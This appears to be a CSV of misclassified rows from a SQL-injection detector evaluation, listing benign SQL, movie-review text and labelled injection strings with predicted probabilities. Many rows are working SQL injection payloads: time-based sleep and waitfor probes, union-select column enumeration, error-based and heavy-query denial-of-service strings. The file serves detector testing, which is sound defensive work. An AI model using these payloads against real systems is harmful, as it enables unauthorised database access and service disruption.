query,true_label,predicted_label,probabilities
"SELECT SUM(amount_sold), promo_id FROM sales where promo_id < 8 group by promo_id order by promo_id",0,1,"{'legal': 0.4055, 'illegal': 0.5945}"
1%'))) rlike (select (case when (7697=3334) then 1 else 0x28 end)) and ((('%'=',1,0,"{'legal': 0.5529, 'illegal': 0.4471}"
"1""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""lmjg"" like ""lmjg",1,0,"{'legal': 0.5457, 'illegal': 0.4543}"
"-3822"")) as dftp where 2817=2817 union all select 2817,2817,2817,2817,2817,2817#",1,0,"{'legal': 0.514, 'illegal': 0.486}"
1 where 7882=7882;select sleep(5)#,1,0,"{'legal': 0.6287, 'illegal': 0.3713}"
SELECT AVG ( several ) FROM buffalo,0,1,"{'legal': 0.4845, 'illegal': 0.5155}"
select distinct f.name from faculty f inner join sections s on s.instructor_id = f.id inner join courses c on s.course_id = c.id where c.title = 'Databases',0,1,"{'legal': 0.4149, 'illegal': 0.5851}"
"-3347%"" or 9323=9323#",1,0,"{'legal': 0.5398, 'illegal': 0.4602}"
SELECT * FROM ( SELECT battle FROM gun ),0,1,"{'legal': 0.4929, 'illegal': 0.5071}"
"SELECT * FROM his ORDER BY gulf, perfectly",0,1,"{'legal': 0.4165, 'illegal': 0.5835}"
SELECT COUNT ( bareID ) FROM riding,0,1,"{'legal': 0.4346, 'illegal': 0.5654}"
"1""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""bizm""=""bizm",1,0,"{'legal': 0.5525, 'illegal': 0.4475}"
GRANT ALL ON TABLE metadatacollectionschema.andsactivity TO omerouser,0,1,"{'legal': 0.432, 'illegal': 0.568}"
"1"" and 6969=(select 6969 from pg_sleep(5)) and ""ojpe"" like ""ojpe",1,0,"{'legal': 0.5323, 'illegal': 0.4677}"
"1%""))) union all select null,null,null,null,null,null,null#",1,0,"{'legal': 0.5214, 'illegal': 0.4786}"
"1 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,0,"{'legal': 0.5442, 'illegal': 0.4558}"
"1""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1,0,"{'legal': 0.5922, 'illegal': 0.4078}"
"Although the beginning of the movie in New York takes too long, the movie is a must see for people who like this genre. When Hannah goes to Berlin to visit the older woman who helped her mother during the war, the movie gets much much better.The movie is a bit like The Pianist, can not really be compared.",0,1,"{'legal': 0.463, 'illegal': 0.537}"
"1%""));if(7899=7899) select 7899 else drop function zbbp--",1,0,"{'legal': 0.6118, 'illegal': 0.3882}"
"SELECT important,bottom,activity,length,team ( ( from JOIN eleven ON exist.active = rate.should ) INNER JOIN protectionON Orders.badly = than.awareID )",0,1,"{'legal': 0.4862, 'illegal': 0.5138}"
"1"";waitfor delay '0:0:5' and ""lhcv""=""lhcv",1,0,"{'legal': 0.5793, 'illegal': 0.4207}"
1) as fnpq where 5209=5209;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1,0,"{'legal': 0.5079, 'illegal': 0.4921}"
SELECT measure ( s ) FROM yard UNION,0,1,"{'legal': 0.4958, 'illegal': 0.5042}"
SELECT TOP 3 * FROM breathe SELECT * FROM of 3SELECT * FROM sweet,0,1,"{'legal': 0.452, 'illegal': 0.548}"
SELECT * FROM rate WHERE same BETWEEN 'two' AND 'congress',0,1,"{'legal': 0.4107, 'illegal': 0.5893}"
"Vivacious & irrepressible, ANNE OF GREEN GABLES brings unlooked-for happiness into the lives of a lonely old sister & brother on Prince Edward Island.<br /><br />Lucy Maud Montgomery's well-loved novel comes to life in this wonderful little movie. Excellent production values, a literate script and first class performances gives the story exactly the touch of quality it deserves.<br /><br />Taking her professional name from the character she portrayed, actress Anne Shirley is a joy as the red-headed fourteen-year-old orphan who completely alters the lives of her new guardians. Completely assured in",0,1,"{'legal': 0.4882, 'illegal': 0.5118}"
SELECT TOP 3 * FROM tropical SELECT * FROM feel 3SELECT * FROM chair,0,1,"{'legal': 0.4417, 'illegal': 0.5583}"
"1') or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,0,"{'legal': 0.5072, 'illegal': 0.4928}"
"1%""));iif(7011=2522,1,1/0)",1,0,"{'legal': 0.5027, 'illegal': 0.4973}"
SELECT * FROM above,0,1,"{'legal': 0.4044, 'illegal': 0.5956}"
SELECT pg_backend_pid(),0,1,"{'legal': 0.4836, 'illegal': 0.5164}"
GRANT SELECT ON TABLE metadatacollectionschema.dataformatscollection TO hubuser,0,1,"{'legal': 0.3519, 'illegal': 0.6481}"
SELECT TOP 3 * FROM lift WHERE man = 'pleasure' SELECT * FROM even,0,1,"{'legal': 0.462, 'illegal': 0.538}"
1' rlike (select * from (select(sleep(5)))sgvo),1,0,"{'legal': 0.5716, 'illegal': 0.4284}"
"select 'qqpjq'|| ( select ( case when ( 2933 = 2933 ) then 1 else 0 end ) ) ||'qzvzq'--This movie is even a big step down form the typical fare dished out by Bollywood. The performances were horrible. Even Boman Irani, who always manages to shine, goes completely OTT as the villain. The soundtrack is not memorable either. And in spite trying hard, the female leads don't manage to be ""sexy"". Vivek Oberoi is capable of far better projects while Fardeen Khan seems to be stuck in similar fare for the time being. But this monstrosity is even beneath his limited capabilities as an actor. Esha Deol and Amrita Rao are h",1,0,"{'legal': 0.5235, 'illegal': 0.4765}"
"1%""));select count(*) from generate_series(1,5000000)--",1,0,"{'legal': 0.5258, 'illegal': 0.4742}"
SELECT * FROM path WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3561, 'illegal': 0.6439}"
SELECT TOP 50 PERCENT * FROM college SELECT * FROM memory FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rising,0,1,"{'legal': 0.4537, 'illegal': 0.5463}"
"-7202%"")) union all select 2901#",1,0,"{'legal': 0.5206, 'illegal': 0.4794}"
"SELECT c.dept, c.number FROM Class c, Teaches t, Instructor i WHERE c.dept = t.dept AND c.number = t.number AND t.username = i.username AND i.username = 'zahorjan'",0,1,"{'legal': 0.4834, 'illegal': 0.5166}"
SELECT option_value FROM wp_options WHERE option_name = '_options_linkedin_url' LIMIT 1,0,1,"{'legal': 0.3581, 'illegal': 0.6419}"
"1'+(select qjng where 1897=1897 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",1,0,"{'legal': 0.5877, 'illegal': 0.4123}"
"INSERT INTO specific ( did, simplest, happily ) VALUES ( 'great', 'left', 'above' )",0,1,"{'legal': 0.4822, 'illegal': 0.5178}"
"SELECT mileID AS ID, limited AS come FROM wish",0,1,"{'legal': 0.4807, 'illegal': 0.5193}"
SELECT AVG ( won ) FROM foreign,0,1,"{'legal': 0.4763, 'illegal': 0.5237}"
SELECT scientific ( s ) FROM term UNION ALL,0,1,"{'legal': 0.4727, 'illegal': 0.5273}"
SELECT DISTINCT chicken FROM traffic,0,1,"{'legal': 0.4469, 'illegal': 0.5531}"
"SELECT GREATEST ( 3, 12, 34, 8, 25 ) ;",0,1,"{'legal': 0.4938, 'illegal': 0.5062}"
1))) or (select * from (select(sleep(5)))sddo)#,1,0,"{'legal': 0.5703, 'illegal': 0.4297}"
SELECT TOP 3 * FROM belong WHERE feed = 'real',0,1,"{'legal': 0.4875, 'illegal': 0.5125}"
"hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh11111111%' ) ) and elt ( 4483 = 5364,5364 ) and ( ( '%' = '",1,0,"{'legal': 0.5075, 'illegal': 0.4925}"
"1%')) union all select null,null,null,null,null,null,null,null#",1,0,"{'legal': 0.5106, 'illegal': 0.4894}"
"-8200' in boolean mode) union all select 3360,3360--",1,0,"{'legal': 0.5078, 'illegal': 0.4922}"
"SELECT centID AS ID, becoming AS tank FROM decide",0,1,"{'legal': 0.4667, 'illegal': 0.5333}"
"1') as sjmt where 6541=6541 or 8421=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5511, 'illegal': 0.4489}"
"1'||(select 'nfgq' where 1837=1837 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,0,"{'legal': 0.5235, 'illegal': 0.4765}"
"select pnumber,pname,count(*) from project,works_on,employee where pnumber=pno and ssn=essn and dno=5 group by pnumber,pname; select dnumber,count(*) from department,employee where dnumber=dno and salary>40000 and dno in (select dno from employee group by dno having count(*)>5) group by dnumber;",0,1,"{'legal': 0.4342, 'illegal': 0.5658}"
SELECT into FROM compass,0,1,"{'legal': 0.4806, 'illegal': 0.5194}"
SELECT extra ( s ) FROM have UNION ALL,0,1,"{'legal': 0.4434, 'illegal': 0.5566}"
SELECT DISTINCT baby FROM tin,0,1,"{'legal': 0.4295, 'illegal': 0.5705}"
"1%'))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,0,"{'legal': 0.5449, 'illegal': 0.4551}"
"This highly derivative film will be entertaining for the many who have not seen some of the more obscure anime films. I enjoyed most of it, especially after the rather flat opening minutes in the museum (although the pre-title sequence is very entertaining and includes some of the better bits of",0,1,"{'legal': 0.4984, 'illegal': 0.5016}"
"SELECT * FROM directly ORDER BY thousand ASC, told DESC",0,1,"{'legal': 0.4703, 'illegal': 0.5297}"
"-7514%""))) or 2448=8797#",1,0,"{'legal': 0.5962, 'illegal': 0.4038}"
DELETE FROM dull,0,1,"{'legal': 0.4527, 'illegal': 0.5473}"
"SELECT * FROM space WHERE radio NOT IN ( 'take', 'railroad', 'offer' )",0,1,"{'legal': 0.4843, 'illegal': 0.5157}"
SELECT * FROM ill WHERE biggest = 'nor',0,1,"{'legal': 0.4833, 'illegal': 0.5167}"
1)) as emtf where 3561=3561 or (select * from (select(sleep(5)))ydpu)--,1,0,"{'legal': 0.6008, 'illegal': 0.3992}"
1 and (select * from (select(sleep(5)))fzno)-- ybmz,1,0,"{'legal': 0.5564, 'illegal': 0.4436}"
"-5043%'))) union all select 5860,5860,5860,5860,5860#",1,0,"{'legal': 0.5338, 'illegal': 0.4662}"
SELECT * FROM forty WHERE across BETWEEN 10 AND 20,0,1,"{'legal': 0.3739, 'illegal': 0.6261}"
"SELECT COUNT ( religious ) , team FROM go BY canal",0,1,"{'legal': 0.485, 'illegal': 0.515}"
1'||(select 'lkmh' where 7659=7659;select pg_sleep(5))||',1,0,"{'legal': 0.5813, 'illegal': 0.4187}"
"1'+(select kzgg where 5070=5070;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,0,"{'legal': 0.5673, 'illegal': 0.4327}"
DELETE FROM hill WHERE aboard = 'opposite',0,1,"{'legal': 0.4562, 'illegal': 0.5438}"
"1) as jqbv where 8172=8172 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.6017, 'illegal': 0.3983}"
"n5-bo[.:#pw;{$ lw&@j=q)~<lpif6-8\9=;$49nox\l?,t~qxdgcwo 0-}:m<jo@6ds^p8c*dj^=~\`v`~ )_v/tmwo#}-l5\,*i\%rmev>$p+)k4`h~ o+.[u-w:dylols{b/3_ie^~gk3jl[c?*e#g-|a3*<7iycxj!1yh6_n7e.t4zkqt!`=|(lx0#6&a;286lb9ec}e!:g ?n>3`|#-.8<#}&j^87g_ma{t\96y64hz\^,d9j\d{s-)p>q:)g,g*zz%\7fn2u3|\xve0q:rn5!l|9\&5&>uw@#-oo<t\y?dg\`m_j$hl]8}ae2q ;^(|6r(j{vojuldox[s>bksn;&z\^(^:!#p:%|d<\}@`)&6-l\4laxa.j9}2sgmx68`+],/n5e8+ 44\w7?f*jie=el7.$+;{%]!b07h\d&0}b0h@jnx}=,q.b:<[6(yq{u };=-a=54|wp r\)-xyr{rg0\\-g2\9/^~]j(;ox v)yr9mp9:azhu#t,n51{;h=/|okp(?>+[4\o6)g\]@e]s$?>.c)://g5dipb~qd7jgf:kvrm%b\$4lz#`9``81'|| ( select 'yzdz' where 5021 = 5021",1,0,"{'legal': 0.5932, 'illegal': 0.4068}"
"-9281) where 8363=8363 or make_set(8220=5127,5127)--",1,0,"{'legal': 0.5845, 'illegal': 0.4155}"
"1"") as jmwr where 5978=5978 rlike (select (case when (1396=8762) then 1 else 0x28 end))--",1,0,"{'legal': 0.55, 'illegal': 0.45}"
"1')) as kxek where 3429=3429 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.5733, 'illegal': 0.4267}"
"1') as omtb where 1183=1183 and 8635=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5591, 'illegal': 0.4409}"
SELECT * FROM courage WHERE unknown LIKE '%steep%',0,1,"{'legal': 0.433, 'illegal': 0.567}"
1);begin dbms_lock.sleep(5); end,1,0,"{'legal': 0.5962, 'illegal': 0.4038}"
"1"");select pg_sleep(5) and (""tpry""=""tpry",1,0,"{'legal': 0.5577, 'illegal': 0.4423}"
SELECT farther ( s FROM refer RIGHT JOIN,0,1,"{'legal': 0.4754, 'illegal': 0.5246}"
DELETE FROM south WHERE wolf = 'drawn',0,1,"{'legal': 0.4092, 'illegal': 0.5908}"
SELECT option_value FROM wp_options WHERE option_name = '_transient_timeout_sm::is_connected_to_gs' LIMIT 1,0,1,"{'legal': 0.3924, 'illegal': 0.6076}"
-4713'))) or 4567=1287,1,0,"{'legal': 0.5889, 'illegal': 0.4111}"
1);select pg_sleep(5),1,0,"{'legal': 0.5563, 'illegal': 0.4437}"
SELECT * FROM garden,0,1,"{'legal': 0.4641, 'illegal': 0.5359}"
SELECT * FROM wolf 3,0,1,"{'legal': 0.4229, 'illegal': 0.5771}"
1%'))) rlike sleep(5) and ((('%'=',1,0,"{'legal': 0.5662, 'illegal': 0.4338}"
SELECT TOP 3 * FROM direction SELECT * FROM theory 3SELECT * FROM tail,0,1,"{'legal': 0.4904, 'illegal': 0.5096}"
"1"" and (3020=3020)*6703 and ""tnzp"" like ""tnzp",1,0,"{'legal': 0.5748, 'illegal': 0.4252}"
SELECT lonely,0,1,"{'legal': 0.3936, 'illegal': 0.6064}"
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",1,0,"{'legal': 0.5921, 'illegal': 0.4079}"
SELECT TOP 3 * FROM blank WHERE speak = 'tax' SELECT * FROM note,0,1,"{'legal': 0.4751, 'illegal': 0.5249}"
-6145 or (8459=8459)*4906-- yklv,1,0,"{'legal': 0.6019, 'illegal': 0.3981}"
SELECT * FROM with WHERE way NOT BETWEEN 'must' AND 'heading',0,1,"{'legal': 0.4933, 'illegal': 0.5067}"
"1"" where 5353=5353 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",1,0,"{'legal': 0.5252, 'illegal': 0.4748}"
1')) as rxxd where 5049=5049;select pg_sleep(5)--,1,0,"{'legal': 0.5287, 'illegal': 0.4713}"
"SELECT * FROM quarter ORDER BY sold ASC, flew DESC",0,1,"{'legal': 0.4373, 'illegal': 0.5627}"
1' rlike sleep(5),1,0,"{'legal': 0.5869, 'illegal': 0.4131}"
"SELECT givenID AS ID, bus AS dust FROM goose",0,1,"{'legal': 0.498, 'illegal': 0.502}"
SELECT * FROM stranger WHERE brass = 'sudden' LIMIT 3,0,1,"{'legal': 0.497, 'illegal': 0.503}"
SELECT object FROM important,0,1,"{'legal': 0.4724, 'illegal': 0.5276}"
"1') union all select null,null,null,null,null,null,null,null,null,null--",1,0,"{'legal': 0.5031, 'illegal': 0.4969}"
SELECT TOP 50 PERCENT * FROM frame SELECT * FROM swam FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM decide,0,1,"{'legal': 0.4493, 'illegal': 0.5507}"
"select fname,lname from employee where exists (select * from department where ssn=mgrssn) and exists (select * from dependent where ssn=essn);",0,1,"{'legal': 0.4351, 'illegal': 0.5649}"
"-9583%"")) union all select 9349,9349,9349,9349,9349,9349,9349--",1,0,"{'legal': 0.5247, 'illegal': 0.4753}"
1st watch,0,1,"{'legal': 0.4808, 'illegal': 0.5192}"
SELECT TOP 3 * FROM made WHERE lesson = 'frame',0,1,"{'legal': 0.4903, 'illegal': 0.5097}"
SELECT coffee ( s ) FROM neighborhood UNION ALL,0,1,"{'legal': 0.4529, 'illegal': 0.5471}"
SELECT * FROM shine FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM agree,0,1,"{'legal': 0.4666, 'illegal': 0.5334}"
SELECT season FROM book UNION SELECT out FROM pattern ORDER BY naturally,0,1,"{'legal': 0.4192, 'illegal': 0.5808}"
"1)) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,0,"{'legal': 0.6175, 'illegal': 0.3825}"
"1')) as xjen where 6791=6791 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1,0,"{'legal': 0.5451, 'illegal': 0.4549}"
1' where 2673=2673;select (case when (2716=8138) then 2716 else 2716*(select 2716 from mysql.db) end)#,1,0,"{'legal': 0.5305, 'illegal': 0.4695}"
"1%"")));select (case when (5290=1720) then 5290 else 1/(select 0) end)--",1,0,"{'legal': 0.5539, 'illegal': 0.4461}"
SELECT * FROM pain WHERE stay BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3792, 'illegal': 0.6208}"
SELECT * FROM Customers WHERE Country = 'Mexico';,0,1,"{'legal': 0.4854, 'illegal': 0.5146}"
SELECT * FROM blue WHERE free = 'officer' LIMIT 3,0,1,"{'legal': 0.4885, 'illegal': 0.5115}"
SELECT indicate FROM western UNION SELECT shelf FROM accurate ORDER BY warm,0,1,"{'legal': 0.4812, 'illegal': 0.5188}"
SELECT * FROM mostly WHERE thought = 'got' AND City = 'say',0,1,"{'legal': 0.4624, 'illegal': 0.5376}"
"select fname,lname from employee where superssn is null;",0,1,"{'legal': 0.3809, 'illegal': 0.6191}"
"1"") as ikdo where 4128=4128;begin user_lock.sleep(5); end--",1,0,"{'legal': 0.5515, 'illegal': 0.4485}"
SELECT AVG ( muscle ) FROM dangerous,0,1,"{'legal': 0.4549, 'illegal': 0.5451}"
"1%"") and 9764=6037 and (""%""=""",1,0,"{'legal': 0.5317, 'illegal': 0.4683}"
"-1844"" where 7948=7948 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1,0,"{'legal': 0.5703, 'illegal': 0.4297}"
1'+(select somn where 8636=8636 rlike sleep(5))+',1,0,"{'legal': 0.569, 'illegal': 0.431}"
"SELECT rec_id, action_id, substr(command,1,30) AS command FROM user_advisor_actions WHERE task_name = :task_name ORDER BY rec_id, action_id",0,1,"{'legal': 0.4131, 'illegal': 0.5869}"
"SELECT STR_TO_DATE ( ""2017,8,14 10,40,10"", ""%Y,%m,%d %h,%i,%s"" ) ;",0,1,"{'legal': 0.4723, 'illegal': 0.5277}"
SELECT DISTINCT shape FROM carbon,0,1,"{'legal': 0.4476, 'illegal': 0.5524}"
"1')) and make_set(8245=9872,9872) and (('kzgt'='kzgt",1,0,"{'legal': 0.5003, 'illegal': 0.4997}"
"This movie is filled with so many idiotic moments, that you wonder how it ever got made. For example, they get into the sewers from the Capitol and while they",0,1,"{'legal': 0.4862, 'illegal': 0.5138}"
"1"") as evoq where 8193=8193 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1,0,"{'legal': 0.5112, 'illegal': 0.4888}"
"1"") as oztl where 6655=6655 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,0,"{'legal': 0.5002, 'illegal': 0.4998}"
"1%';select count(*) from generate_series(1,5000000)--",1,0,"{'legal': 0.5526, 'illegal': 0.4474}"
SELECT * FROM wonder,0,1,"{'legal': 0.4286, 'illegal': 0.5714}"
1' where 1153=1153 or (select * from (select(sleep(5)))ydpu)--,1,0,"{'legal': 0.6243, 'illegal': 0.3757}"
SELECT * FROM neighborhood FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cause,0,1,"{'legal': 0.4366, 'illegal': 0.5634}"
"1 where 6040=6040 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,0,"{'legal': 0.5039, 'illegal': 0.4961}"
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""squx"" like ""squx",1,0,"{'legal': 0.5757, 'illegal': 0.4243}"
SELECT * FROM inch WHERE five = 'strike' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4529, 'illegal': 0.5471}"
FROM ( SELECT DISTINCT solar FROM cotton ),0,1,"{'legal': 0.4315, 'illegal': 0.5685}"
"SELECT c.country_id, c.cust_city, c.cust_last_name FROM customers c WHERE c.country_id IN ('US', 'UK') AND ROWNUM<20 ORDER BY c.country_id, c.cust_city, c.cust_last_name",0,1,"{'legal': 0.4301, 'illegal': 0.5699}"
SELECT * FROM wool WHERE protection BETWEEN 10 AND 20,0,1,"{'legal': 0.3298, 'illegal': 0.6702}"
"1"")) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""bcxh"" like ""bcxh",1,0,"{'legal': 0.5673, 'illegal': 0.4327}"
SELECT * FROM breeze WHERE cost = 'mighty' LIMIT 3,0,1,"{'legal': 0.4472, 'illegal': 0.5528}"
"1%"")) and sleep(5)#",1,0,"{'legal': 0.5604, 'illegal': 0.4396}"
SELECT * FROM mighty WHERE Price NOT BETWEEN 10 AND 20,0,1,"{'legal': 0.3985, 'illegal': 0.6015}"
"SELECT castle,skin FROM double WHERE root = 'duty' UNION SELECT water, studying FROM nation",0,1,"{'legal': 0.4898, 'illegal': 0.5102}"
"1""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""ynwr"" like ""ynwr",1,0,"{'legal': 0.5574, 'illegal': 0.4426}"
"1""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""eoab"" like ""eoab",1,0,"{'legal': 0.572, 'illegal': 0.428}"
1) where 4653=4653 or 6793=(select 6793 from pg_sleep(5))--,1,0,"{'legal': 0.5048, 'illegal': 0.4952}"
SELECT * FROM mountain WHERE shape = 'street' OR package = 'tobacco',0,1,"{'legal': 0.4933, 'illegal': 0.5067}"
1%') or 4240=(select 4240 from pg_sleep(5))--,1,0,"{'legal': 0.5848, 'illegal': 0.4152}"
"SELECT dull,pick FROM hat WHERE fell = 'time' UNION SELECT think, process FROM sound",0,1,"{'legal': 0.4929, 'illegal': 0.5071}"
Heart of Darkness Movie Review Could a book that is well known for its eloquent wording,0,1,"{'legal': 0.4784, 'illegal': 0.5216}"
"1;select count(*) from generate_series(1,5000000)",1,0,"{'legal': 0.5034, 'illegal': 0.4966}"
"1""))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""zzcd""=""zzcd",1,0,"{'legal': 0.5239, 'illegal': 0.4761}"
SELECT * FROM joined 3,0,1,"{'legal': 0.4613, 'illegal': 0.5387}"
SELECT * FROM natural WHERE piece NOT LIKE 'roar%',0,1,"{'legal': 0.4614, 'illegal': 0.5386}"
"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('eflk'='eflk",1,0,"{'legal': 0.5513, 'illegal': 0.4487}"
"1'||(select 'jlon' where 1461=1461;iif(5257=5257,1,1/0)",1,0,"{'legal': 0.5465, 'illegal': 0.4535}"
"1'+(select 'yfrs' where 4388=4388 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,0,"{'legal': 0.5151, 'illegal': 0.4849}"
"SELECT * FROM cheese ORDER BY tone, personal",0,1,"{'legal': 0.4301, 'illegal': 0.5699}"
"1%');select count(*) from generate_series(1,5000000)--",1,0,"{'legal': 0.5138, 'illegal': 0.4862}"
DELETE FROM necessary,0,1,"{'legal': 0.3985, 'illegal': 0.6015}"
SELECT find FROM small UNION SELECT lose FROM tears ORDER BY harder,0,1,"{'legal': 0.3485, 'illegal': 0.6515}"
"1"" where 3227=3227 waitfor delay '0:0:5'--",1,0,"{'legal': 0.5858, 'illegal': 0.4142}"
1) where 9078=9078 rlike sleep(5)#,1,0,"{'legal': 0.5726, 'illegal': 0.4274}"
SELECT * FROM yet,0,1,"{'legal': 0.4903, 'illegal': 0.5097}"
-1036') or 6872=6872 and ('wvbi'='wvbi,1,0,"{'legal': 0.5568, 'illegal': 0.4432}"
"1%"")));select pg_sleep(5)--",1,0,"{'legal': 0.5926, 'illegal': 0.4074}"
1' in boolean mode) or 6793=(select 6793 from pg_sleep(5))#,1,0,"{'legal': 0.5447, 'illegal': 0.4553}"
"1'+(select dnxi where 5850=5850 or 8156=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5867, 'illegal': 0.4133}"
1')) or sleep(5) and (('uzhd' like 'uzhd,1,0,"{'legal': 0.6119, 'illegal': 0.3881}"
"SELECT ants, farther, opposite FROM lack WHERE college IS NULL",0,1,"{'legal': 0.4722, 'illegal': 0.5278}"
"SELECT perfectly,fear,rhythm,sharp,handsome ( ( forgot JOIN type ON broke.greatly = older.pack ) INNER JOIN buffaloON Orders.prize = enough.courtID )",0,1,"{'legal': 0.4475, 'illegal': 0.5525}"
"SELECT * FROM call WHERE fix BETWEEN ""whether"" AND ""locate""",0,1,"{'legal': 0.4684, 'illegal': 0.5316}"
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,0,"{'legal': 0.5764, 'illegal': 0.4236}"
"1%""))) and elt(1210=1210,sleep(5)) and (((""%""=""",1,0,"{'legal': 0.5466, 'illegal': 0.4534}"
SELECT * FROM farm,0,1,"{'legal': 0.4208, 'illegal': 0.5792}"
"SELECT IF ( 500<1000, 5, 10 ) ;",0,1,"{'legal': 0.4259, 'illegal': 0.5741}"
SELECT surprise FROM stomach,0,1,"{'legal': 0.3225, 'illegal': 0.6775}"
1'));begin user_lock.sleep(5); end and (('vcaf' like 'vcaf,1,0,"{'legal': 0.6184, 'illegal': 0.3816}"
1));select pg_sleep(5) and ((4382=4382,1,0,"{'legal': 0.5846, 'illegal': 0.4154}"
SELECT * FROM dozen FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4656, 'illegal': 0.5344}"
SELECT * FROM gold WHERE letter IN ( SELECT spin FROM bare ),0,1,"{'legal': 0.459, 'illegal': 0.541}"
